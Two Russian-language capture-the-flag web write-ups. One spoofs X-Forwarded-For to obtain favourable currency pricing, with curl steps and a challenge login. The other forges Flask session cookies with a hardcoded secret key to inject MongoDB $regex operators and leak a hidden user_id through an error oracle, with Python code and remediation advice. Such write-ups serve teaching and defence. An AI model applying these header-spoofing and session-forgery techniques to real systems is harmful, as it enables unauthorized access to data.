# [WEB] CTF Market – Currency Trick

**Флаг:** `CTFCup{Cur3ncy_Tr1ck5_N3v3r_F41L}`  

## Идея

В фронтенде есть legacy-код:

- `shop.js` (старый `completePurchase`):
  - после успешной покупки был редирект на `/purchase-details?secret=premium`
  - бонус-код: `BONUS-CTF-COIN`
- `auth.js` (старый `authenticateUser`):

  ```js
  'X-Forwarded-For': getUserLocation() || '127.0.0.1'
  // DO NOT DELETE YET! (Mike, 2024-10-15)
  ```

Сервер использует `X-Forwarded-For` для определения региона и валюты/курса, а мы можем его подменить.

---

## Эксплуатация

1. **Логин с подменой IP на США**

   ```bash
   curl -X POST \
     -H "Content-Type: application/json" \
     -H "X-Forwarded-For: 8.8.8.8" \
     -d '{"email": "ctf_c0c84c12@ctfmarket.com", "password": "cddd19febff79f7a"}' \
     -c cookies.txt \
     http://158.160.13.253:30621/api/auth
   ```

2. **Проверяем аккаунт**

   ```bash
   curl -b cookies.txt http://158.160.13.253:30621/api/account
   ```

   Важное из ответа:

   ```json
   {"coins":100,"currency":"RUB-USD","exchange_rate":80}
   ```

3. **Проверяем корзину**

   ```bash
   curl -b cookies.txt http://158.160.13.253:30621/api/basket
   ```

   Товар: `Premium CTF Membership (Annual)` за `8.75 USD`.

4. **Применяем бонус-код**

   ```bash
   curl -X POST \
     -b cookies.txt \
     "http://158.160.13.253:30621/api/bonus?code=BONUS-CTF-COIN"
   ```

5. **Завершаем покупку**

   ```bash
   curl -X POST \
     -b cookies.txt \
     http://158.160.13.253:30621/api/purchase
   ```

   Ответ: `{"response":"Purchase completed successfully"}`

6. **Ручной переход на скрытую страницу**

   ```bash
   curl -b cookies.txt \
     "http://158.160.13.253:30621/purchase-details?secret=premium"
   ```

   В ответе:

   ```html
   <p style="color: red; font-weight: bold;">
     CTFCup{Cur3ncy_Tr1ck5_N3v3r_F41L}
   </p>
   ```

---

## Суть бага

- Сервер доверяет клиентскому `X-Forwarded-For` и выбирает валюту/курс по нему.
- При IP из США наши 100 монет с выгодным курсом считаются достаточными для покупки.
- После успешной покупки legacy-страница `/purchase-details?secret=premium` всё ещё доступна и выдаёт флаг.


# NoSQL-инъекция через Flask-сессии и MongoDB

## 1. О чём вообще задача?

Есть веб-приложение на Flask + MongoDB.  
Пользователь может:

- зарегистрироваться / залогиниться
- создавать свои строки `/strings` (name + content)
- смотреть свои строки `/strings` и `/strings/<name>`

Флаг хранится как отдельная строка в коллекции `strings`:

```python
def init_flag():
    mongo.db.strings.update_one(
        {"name": "flag"},
        {
            "$set": {
                "name": "flag",
                "user_id": secrets.token_hex(32),  # случайный user_id
                "content": os.getenv("FLAG"),
            },
        },
        upsert=True,
    )
```

То есть: флаг — это запись с `name = "flag"` и случайным `user_id`, который никто не знает.

---

## 2. Ключевая уязвимость

Смотрим эндпоинт `/strings` (GET):

```python
@app.route("/strings", methods=["GET"])
def get_all_strings():
    if not session:
        return jsonify({"error": "Please login first"}), 401

    user_strings = list(mongo.db.strings.find(dict(session.items())))

    strings_list = []

    for string_data in user_strings:
        if string_data["user_id"] != session.get("user_id"):
            return jsonify({"error": "ooops, some string is not you own"}), 401
        strings_list.append(
            {"name": string_data["name"], "content": string_data["content"]}
        )

    return jsonify({"strings": strings_list}), 200
```

Самое важное место:

```python
user_strings = list(mongo.db.strings.find(dict(session.items())))
```

### Что здесь происходит по шагам

- `session` — это словарь Flask-сессии (то, что хранится в cookie `session`).
- `session.items()` → список пар `(ключ, значение)`, например:  
  `[('user_id', '123456'), ('другой_ключ', 'что-то')]`.
- `dict(session.items())` → снова словарь, например:  
  `{"user_id": "123456"}`.

Этот словарь **без фильтрации** передаётся в Mongo:

```python
mongo.db.strings.find(dict(session.items()))
```

Обычно разработчик ожидает, что там будет просто:

```python
{"user_id": "какой-то-id"}
```

и запрос будет: *найди все строки, где `user_id` == моему user_id*.

Но! Если мы подделаем сессию так:

```python
session = {
    "name": "flag",
    "user_id": {"$regex": "^a"}
}
```

то в Mongo уйдёт запрос:

```python
{"name": "flag", "user_id": {"$regex": "^a"}}
```

А это уже **NoSQL-инъекция**: мы внедрили оператор `$regex` в поле `user_id` и сказали базе:  
“Найди строку с `name = "flag"` и `user_id`, который начинается на `a`”.

---

## 3. Почему мы вообще можем подделывать сессию?

Флаг/сессия подписываются секретным ключом Flask:

```python
app.config["SECRET_KEY"] = "kluchik"
```

Зная секрет (`"kluchik"`), мы можем **сами** генерировать валидную cookie `session`.  
Это делается тестовым Flask-приложением:

```python
from flask import Flask, session

app = Flask(__name__)
app.secret_key = "kluchik"

def encode_session(data):
    with app.test_request_context():
        session.update(data)
        dumped = app.session_interface.get_signing_serializer(app).dumps(dict(session))
        return dumped.decode('utf-8') if isinstance(dumped, bytes) else dumped
```

Дальше мы используем эту функцию для генерации нужных нам сессий и подставляем их в запросы как cookie:  

```python
cookies = {"session": encode_session(data)}
```

---

## 4. Как по факту ломаем (утекает `user_id` флага)

Цель: узнать `user_id` того документа, у которого `name = "flag"`.  
Он — случайный hex на 64 символа.

Идея: использовать `/strings` как **оракул** (источник подсказок):

- Мы подбираем регулярное выражение (`$regex`) для `user_id`.
- Если с таким шаблоном **находится** чужая строка (флаг), цикл `for` обнаруживает, что
  `string_data["user_id"] != session.get("user_id")` и возвращает ошибку:
  ```json
  {"error": "ooops, some string is not you own"}
  ```
  → значит, **есть** совпадающий `user_id` с таким префиксом.
- Если никто не найден — список пустой, и мы получаем:
  ```json
  {"strings": []}
  ```
  → значит, **нет** `user_id` с таким префиксом.

Так, посимвольно (а в коде — бинарным поиском) подбираем каждый символ `user_id`.

Пример проверки префикса:

```python
data = {
    "name": "flag",
    "user_id": {"$regex": "^ab"}  # проверяем, есть ли user_id, начинающийся с "ab"
}
cookie_value = encode_session(data)
cookies = {"session": cookie_value}
response = requests.get("http://87.242.88.13:2020/strings", cookies=cookies)
```

- Если статус 401 + `ooops, some string is not you own` → префикс `"ab"` **подходит**.
- Если `{"strings": []}` → нет, пробуем другой символ.

Скрипт из примера автоматизирует процесс:

- перебирает символы hex (`0-9a-f`);
- сужает диапазон бинарным поиском;
- собирает полный `user_id` длиной 64 символа;
- потом подставляет его в сессию и идёт за флагом на `/strings/flag`.

---

## 5. Получение флага

Когда полный `user_id` флага известен:

```python
def get_flag(leaked_user_id):
    data = {'user_id': leaked_user_id}
    cookie_value = encode_session(data)
    cookies = {'session': cookie_value}
    flag_url = "http://87.242.88.13:2020/strings/flag"
    response = requests.get(flag_url, cookies=cookies)
    if response.status_code == 200:
        json_resp = response.json()
        print(f"Флаг: {json_resp['content']}")
```

Приложение думает, что мы — владелец строки с этим `user_id`, и возвращает:

```json
{
  "name": "flag",
  "content": "CTF{...ТУТ_ФЛАГ...}"
}
```

---

## 6. Объяснение “для совсем новичка”

- Сессия — это как пропуск с надписью “я — пользователь X”.
- Flask подписывает этот пропуск секретным ключом (`"kluchik"`), чтобы его нельзя было подделать.
- Но секрет положили прямо в код → любой, кто его видит, может печатать свои пропуска.
- Сервер берёт содержимое пропуска и **как есть** подсовывает его в запрос к базе (`dict(session.items())`).
- Мы вместо обычного `user_id: "abc"` подсовываем `user_id: {"$regex": "^a"}` — это уже не строка, а команда: “ищи всех, чей id начинается с `a`”.
- По тому, как сервер отвечает (401 с “ooops” или пустой список), мы понимаем, угадали ли очередной символ.
- Повторяя это много раз, узнаём секретный `user_id` флага и потом читаем его, притворившись владельцем.

---

## 7. Как нужно было сделать безопасно

- Не передавать весь `session` в запрос к MongoDB:
  ```python
  mongo.db.strings.find({"user_id": session["user_id"]})
  ```
  а не `dict(session.items())`.
- Валидировать значения: `user_id` должен быть строкой определённого формата, а не словарём с `$regex`.
- Не хранить `SECRET_KEY` в открытом виде в репозитории / таске.
- Не полагаться на данные сессии как на “честные” — они всегда потенциально подделаны.

---

